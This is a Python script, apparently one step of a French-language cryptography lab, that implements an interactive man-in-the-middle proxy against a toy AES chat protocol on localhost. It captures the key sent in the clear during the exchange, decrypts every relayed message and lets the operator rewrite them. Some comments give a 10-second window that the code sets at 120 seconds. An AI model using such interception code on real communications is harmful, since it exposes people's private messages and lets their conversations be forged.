"""
Étape 5 — Attaque Man In The Middle (MITM)
L'attaquant intercepte la clé AES et peut modifier chaque message à la volée.
"""

import socket
import threading
import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'server'))
from aes_crypto import aes_decrypt, aes_encrypt

REAL_SERVER_HOST = '127.0.0.1'
REAL_SERVER_PORT = 5556
MITM_PORT = 5557

intercepted_key = None
message_queue = {}
queue_lock = threading.Lock()

def recv_msg(sock):
    """Reçoit un message préfixé par sa taille (4 octets)."""
    raw_size = b''
    while len(raw_size) < 4:
        chunk = sock.recv(4 - len(raw_size))
        if not chunk:
            return None
        raw_size += chunk
    size = int.from_bytes(raw_size, 'big')
    data = b''
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            return None
        data += chunk
    return data

def send_msg(sock, data):
    """Envoie un message préfixé par sa taille (4 octets)."""
    sock.send(len(data).to_bytes(4, 'big') + data)

def forward(src, dst, label):
    """Relaie les messages — l'attaquant peut modifier chaque message."""
    while True:
        try:
            data = recv_msg(src)
            if not data:
                break

            if intercepted_key and len(data) > 12:
                try:
                    message = aes_decrypt(intercepted_key, data)
                    print(f"\n[MITM] Message intercepté de {label} : {message}")
                    print(f"[?] Modifier ce message ? (Entrée = laisser tel quel, ou tape le nouveau message) : ", end='', flush=True)

                    # L'attaquant a 10 secondes pour modifier
                    import select
                    ready = select.select([sys.stdin], [], [], 120)[0]
                    if ready:
                        new_message = sys.stdin.readline().strip()
                        if new_message:
                            print(f"[!!!] Message modifié : '{message}' → '{new_message}'")
                            data = aes_encrypt(intercepted_key, new_message)
                        else:
                            print(f"[*] Message transmis tel quel")
                    else:
                        print(f"[*] Timeout (120s) — message transmis tel quel")

                except Exception as e:
                    pass

            send_msg(dst, data)

        except:
            break

def handle_client(client_sock, client_addr):
    """Gère une connexion client — intercepte la clé et relaie les messages."""
    global intercepted_key

    print(f"[+] Client connecté : {client_addr}")

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.connect((REAL_SERVER_HOST, REAL_SERVER_PORT))

    # Phase échange de clé
    nick_msg = recv_msg(server_sock)
    send_msg(client_sock, nick_msg)

    nickname = recv_msg(client_sock)
    send_msg(server_sock, nickname)
    print(f"[*] Pseudo intercepté : {nickname.decode()}")

    key_instruction = recv_msg(server_sock)
    send_msg(client_sock, key_instruction)

    if key_instruction == b"GENKEY":
        aes_key_data = recv_msg(client_sock)
        intercepted_key = aes_key_data
        print(f"\n[!!!] CLÉ AES INTERCEPTÉE : {intercepted_key.hex()}\n")
        send_msg(server_sock, aes_key_data)
        ok_msg = recv_msg(server_sock)
        send_msg(client_sock, ok_msg)

    elif key_instruction == b"RECVKEY":
        aes_key_data = recv_msg(server_sock)
        if intercepted_key is None:
            intercepted_key = aes_key_data
            print(f"\n[!!!] CLÉ AES INTERCEPTÉE : {intercepted_key.hex()}\n")
        send_msg(client_sock, aes_key_data)

    print(f"[*] Phase chat — interception active")
    print(f"[*] Tu as 10 secondes pour modifier chaque message\n")

    t1 = threading.Thread(
        target=forward,
        args=(client_sock, server_sock, nickname.decode())
    )
    t2 = threading.Thread(
        target=forward,
        args=(server_sock, client_sock, f"Serveur→{nickname.decode()}")
    )
    t1.daemon = True
    t2.daemon = True
    t1.start()
    t2.start()
    t1.join()
    t2.join()

def start_mitm():
    """Démarre le proxy MITM interactif."""
    mitm = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mitm.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    mitm.bind(('0.0.0.0', MITM_PORT))
    mitm.listen()
    print(f"[*] MITM interactif en écoute sur port {MITM_PORT}")
    print(f"[*] Relais vers {REAL_SERVER_HOST}:{REAL_SERVER_PORT}\n")

    while True:
        client_sock, client_addr = mitm.accept()
        thread = threading.Thread(target=handle_client, args=(client_sock, client_addr))
        thread.daemon = True
        thread.start()

if __name__ == "__main__":
    start_mitm()
